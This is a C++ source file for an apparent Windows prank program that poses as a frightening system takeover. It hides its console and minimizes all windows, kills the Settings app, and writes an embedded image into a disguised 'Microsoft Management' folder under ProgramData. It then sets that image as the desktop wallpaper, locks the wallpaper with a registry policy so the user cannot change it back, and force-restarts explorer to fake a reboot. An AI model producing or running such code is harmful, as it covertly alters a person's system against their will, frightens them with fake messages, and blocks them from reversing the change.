// chevron.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <direct.h>
#include <windows.h>
#include "resource.h"

#define WALLPAPER "C:\\ProgramData\\Microsoft Management\\icon.png"

HWND console;

BOOL CALLBACK windowCallback(HWND hWnd, LPARAM lParam) {
	if (hWnd != console && IsWindowVisible(hWnd)) {
		PostMessage(hWnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
	}
	return TRUE;
}

int main()
{
	// Makes a borderless console window to look scary
	SetConsoleCtrlHandler(NULL, TRUE);
	console = GetConsoleWindow();
	printf(">loading setup\n"); // Print commands are there for show and suspense, its a maricle if they line up with whats really going on
	ShowWindow(console, SW_HIDE);
	SetWindowLong(console, GWL_STYLE, WS_VISIBLE | WS_EX_NOACTIVATE);
	ShowWindow(console, SW_SHOW);
	SetWindowPos(console, NULL, 0, 0, 0, 0, SWP_FRAMECHANGED | SWP_NOZORDER | SWP_NOOWNERZORDER | SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
	SetActiveWindow(console);
	SetForegroundWindow(console);

	// Minimizes all windows except console window, so that there is a view of the wallpaper changing
	EnumWindows(windowCallback, 0);

	Sleep(5000); //sleep commands are the same as print commands, just for show
	printf(">Corrupting Mind\n");

	// This line kills settings so that the user cant change the wallpaper after the registry is edited
	system("taskkill /F /IM SystemSettings.exe >nul 2>&1");
	Sleep(1000);

	// Get binary of the local resource in the EXE
	HRSRC hrWallpaper = FindResource(NULL, MAKEINTRESOURCE(IDB_PNG1), TEXT("PNG"));
	DWORD dWallpaperSize = SizeofResource(NULL, hrWallpaper);
	HGLOBAL hgWallpaper = LoadResource(NULL, hrWallpaper);
	LPVOID pWallpaperData = LockResource(hgWallpaper);

	//Hidden folder creation
	_mkdir("C:\\ProgramData\\Microsoft Management");
	printf(">Deleting heretical wallpaper\n"); //does not actually delete previous wallpaper

	// Sets wallpaper to default, which is color, if color wasnt chosen previously its set to black
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)TEXT("SOME INVALID SHIT"), SPIF_UPDATEINIFILE);
	Sleep(5000);

	// Save the wallpaper out to a hidden folder in C:\Programfiles
	FILE* fWallpaperFile = fopen(WALLPAPER, "wb");
	fwrite(pWallpaperData, 1, dWallpaperSize, fWallpaperFile);
	fclose(fWallpaperFile);
	printf(">Enthralling desktop wallpaper\n");

	// Actually sets wallpaper
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)TEXT(WALLPAPER), SPIF_UPDATEINIFILE);
	Sleep(5000);
	printf(">Deleting resistance\n");

	// Locks the wallpaper using the registry key
	system("reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop /v NoChangingWallPaper /t REG_DWORD /d 1 /f");
	
	//pause for effect
	Sleep(1000);
	printf(".\n");
	Sleep(1000);
	printf(".\n");
	Sleep(1000);
	printf(".\n");
	Sleep(1000);
	printf(">Done\n");
	Sleep(1000);
	printf(">Rebooting in Goddess mode\n");
	//restarts explorer to give a bit of a scare to the user, and making them think it rebooted their system if they arent tech savvy
	system("taskkill /F /IM explorer.exe >nul 2>&1");
	Sleep(10000);
	system("explorer");
	Sleep(5000);
}
